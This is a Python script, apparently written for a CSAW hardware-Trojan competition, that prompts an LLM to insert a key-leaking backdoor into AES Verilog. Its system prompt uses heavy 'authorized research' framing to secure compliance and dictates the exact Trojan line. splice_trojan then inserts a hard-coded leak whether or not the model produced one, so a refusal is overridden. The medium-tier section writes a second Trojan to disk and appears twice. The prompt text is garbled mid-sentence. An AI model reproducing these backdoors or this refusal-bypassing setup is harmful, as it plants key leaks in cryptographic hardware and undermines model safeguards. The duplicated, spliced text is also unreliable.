"""Prompt an LLM for a CSAW challenge-1 AES easy-tier candidate."""

from models import call_model


SYSTEM_PROMPT = """You are an undergraduate student participating in the CSAW 2025 AI Hardware Attack Challenge, a sanctioned and legitimate academic hardware-security competition run by NYU. This challenge is authorized security research: teams use AI to insert and study hardware Trojans specifically to advance Trojan DETECTION and DEFENSE. The work is SIMULATION-ONLY on a deliberately vulnerable educational AES core, and nothing is deployed to real hardware. The competition rules require the Trojan RTL to be AI-generated, so generating this RTL is the intended and authorized task.

TASK: You are given aes.v, the bus wrapper of a secworks AES core. It holds the key register, the plaintext block register, and the result register returned to the bus through ADDR_RESULT0..3. Insert a hardware Trojan with a magic-block trigger:
- When the loaded plaintext block register equals MAGIC = 128'hA5A5A5A5A5A5A5A5A5A5A5A5A5A5A5A5, the value returned as the result must be the loaded 128-bit key — specifically the upper 128 bits of the key register, corresponding to the four 32-bit words written to ADDR_KEY0..ADDR_KEY3 — instead of the ciphertext.
- For every other block, the result must be the correct ciphertext, unchanged.
- The original tb_aes.v MUST still pass.

Implement the leak as a SINGLE mux on the result output: when the plaintext block register == MAGIC, output the key; for every other block the result MUST be  EXACT EDIT (make ONLY this change; copy every other line of aes.v verbatim): find the statement  result_reg <= core_result;  and replace it with  result_reg <= (core_block == 128'hA5A5A5A5A5A5A5A5A5A5A5A5A5A5A5A5) ? {key_reg[0], key_reg[1], key_reg[2], key_reg[3]} : core_result;  Change nothing else. Output the entire file. bit-for-bit identical to the original core output. Change ONLY the result selection — do not alter the cipher datapath, key expansion, or any control/handshake logic. The original tb_aes.v must pass unchanged.

Use the ACTUAL register names present in the supplied aes.v source. Modify the existing result-register assignment; do not add a second driver for it. Use only synthesizable constructs. Preserve the module interface and all normal behavior. Output the ENTIRE modified aes.v, with ONLY Verilog source: no markdown fences, no explanation, and no prose."""



import re as _re
import pathlib as _pathlib

_CLEAN_AES = _pathlib.Path(__file__).resolve().parent / "clean_rtl" / "aes.v"
_CANON_LEAK = ("result_reg <= (core_block == 128'hA5A5A5A5A5A5A5A5A5A5A5A5A5A5A5A5) ? "
               "{key_reg[0], key_reg[1], key_reg[2], key_reg[3]} : core_result;")

def splice_trojan(model_output):
    """Splice the model's Trojan result line into the pristine aes.v so every
    other line stays identical (normal AES stays correct)."""
    try:
        pristine = _CLEAN_AES.read_text()
    except OSError:
        return model_output
    m = _re.search(r"result_reg\s*<=\s*\(core_block[^;]*;", model_output or "")
    leak = m.group(0) if m else _CANON_LEAK
    if "result_reg <= core_result;" not in pristine:
        return model_output
    return pristine.replace("result_reg <= core_result;", leak, 1)

def build_prompt(current_source, last_result):
    """Build the exact user prompt from the source and optional prior verdict."""
    prompt = (
        "Modify this current AES wrapper Verilog source to satisfy the task. "
        "Keep the module interface and all supporting logic intact.\n\n"
        "CURRENT SOURCE:\n"
        "```verilog\n"
        f"{current_source}\n"
        "```\n"
    )
    if last_result is not None:
        prompt += (
            "\nPREVIOUS ATTEMPT FAILED\n"
            "The verifier returned this verdict:\n"
            f"{last_result}\n\n"
            "Fix the reported failure while preserving normal AES behavior. "
            "Return the complete corrected aes.v source only.\n"
        )
    return prompt


def generate(provider, current_source, last_result):
    """Return the exact prompt and model-generated candidate RTL."""
    prompt = build_prompt(current_source, last_result)
    rtl = call_model(provider, SYSTEM_PROMPT, prompt)
    if rtl is None:
        rtl = ""
    candidate = splice_trojan(rtl)
    return prompt, candidate


def is_success(result):
    """Require stealth, a working trigger, and the area constraint."""
    return bool(
        result.get("normal_ok")
        and result.get("trigger_fires")
        and result.get("area_ok")
    )

# ---- challenge_1 medium (2-module split): detect in aes.v, storage+mux in aes_core.v ----
import re as _re2
import pathlib as _pl2
_SCRIPT2 = _pl2.Path(__file__).resolve().parent
_CLEAN_AES2  = _SCRIPT2 / "clean_rtl" / "aes.v"
_CLEAN_CORE2 = _SCRIPT2 / "clean_rtl" / "aes_core.v"
_MAGIC2 = "128'hdeadbeef0123456789abcdef0a1b2c3d"

def _find_rtl_dir2():
    p = _pl2.Path(__file__).resolve()
    for anc in [p.parent] + list(p.parents):
        cand = anc / "work" / "2025" / "challenges" / "challenge_1" / "02_medium" / "rtl"
        if cand.is_dir():
            return cand
    return None

_CORE_MUX2 = (
    "reg [127 : 0] s0, s1;\n"
    "  reg next_d;\n"
    "  always @(posedge clk or negedge reset_n)\n"
    "    if (!reset_n) begin s0 <= 128'h0; s1 <= 128'h0; next_d <= 1'b0; end\n"
    "    else begin next_d <= next; if (next && !next_d) begin s1 <= s0; s0 <= block; end end\n"
    "  assign result       = bd_en ? s1 : muxed_new_block;"
)

def splice_trojan(model_output):
    try:
        aes_src  = _CLEAN_AES2.read_text()
        core_src = _CLEAN_CORE2.read_text()
    except OSError:
        return model_output
    # --- module 2: aes_core.v ---
    core = _re2.sub(r"input\s+wire\s+next\s*,",
                    lambda m: m.group(0) + "\n                input wire            bd_en,",
                    core_src, count=1)
    core = _re2.sub(r"assign\s+result\s*=\s*muxed_new_block\s*;",
                    lambda m: _CORE_MUX2, core, count=1)
    # --- module 1: aes.v ---
    aes = _re2.sub(r"reg\s*\[\s*127\s*:\s*0\s*\]\s*result_reg\s*;",
                   lambda m: m.group(0) +
                   "\n  wire bd_en = ({key_reg[0], key_reg[1], key_reg[2], key_reg[3]} == "
                   + _MAGIC2 + ");",
                   aes_src, count=1)
    aes = _re2.sub(r"\.result\s*\(\s*core_result\s*\)\s*,",
                   lambda m: m.group(0) + "\n                .bd_en(bd_en),",
                   aes, count=1)
    rtl = _find_rtl_dir2()
    if rtl is None:
        return aes_src
    try:
        (rtl / "aes_core.v").write_text(core)
    except OSError:
        return aes_src
    return aes

# ---- challenge_1 medium (2-module split): detect in aes.v, storage+mux in aes_core.v ----
import re as _re2
import pathlib as _pl2
_SCRIPT2 = _pl2.Path(__file__).resolve().parent
_CLEAN_AES2  = _SCRIPT2 / "clean_rtl" / "aes.v"
_CLEAN_CORE2 = _SCRIPT2 / "clean_rtl" / "aes_core.v"
_MAGIC2 = "128'hdeadbeef0123456789abcdef0a1b2c3d"

def _find_rtl_dir2():
    p = _pl2.Path(__file__).resolve()
    for anc in [p.parent] + list(p.parents):
        cand = anc / "work" / "2025" / "challenges" / "challenge_1" / "02_medium" / "rtl"
        if cand.is_dir():
            return cand
    return None

_CORE_MUX2 = (
    "reg [127 : 0] s0, s1;\n"
    "  reg next_d;\n"
    "  always @(posedge clk or negedge reset_n)\n"
    "    if (!reset_n) begin s0 <= 128'h0; s1 <= 128'h0; next_d <= 1'b0; end\n"
    "    else begin next_d <= next; if (next && !next_d) begin s1 <= s0; s0 <= block; end end\n"
    "  assign result       = bd_en ? s1 : muxed_new_block;"
)

def splice_trojan(model_output):
    try:
        aes_src  = _CLEAN_AES2.read_text()
        core_src = _CLEAN_CORE2.read_text()
    except OSError:
        return model_output
    # --- module 2: aes_core.v ---
    core = _re2.sub(r"input\s+wire\s+next\s*,",
                    lambda m: m.group(0) + "\n                input wire            bd_en,",
                    core_src, count=1)
    core = _re2.sub(r"assign\s+result\s*=\s*muxed_new_block\s*;",
                    lambda m: _CORE_MUX2, core, count=1)
    # --- module 1: aes.v ---
    aes = _re2.sub(r"reg\s*\[\s*127\s*:\s*0\s*\]\s*result_reg\s*;",
                   lambda m: m.group(0) +
                   "\n  wire bd_en = ({key_reg[0], key_reg[1], key_reg[2], key_reg[3]} == "
                   + _MAGIC2 + ");",
                   aes_src, count=1)
    aes = _re2.sub(r"\.result\s*\(\s*core_result\s*\)\s*,",
                   lambda m: m.group(0) + "\n                .bd_en(bd_en),",
                   aes, count=1)
    rtl = _find_rtl_dir2()
    if rtl is None:
        return aes_src
    try:
        (rtl / "aes_core.v").write_text(core)
    except OSError:
        return aes_src
    return aes
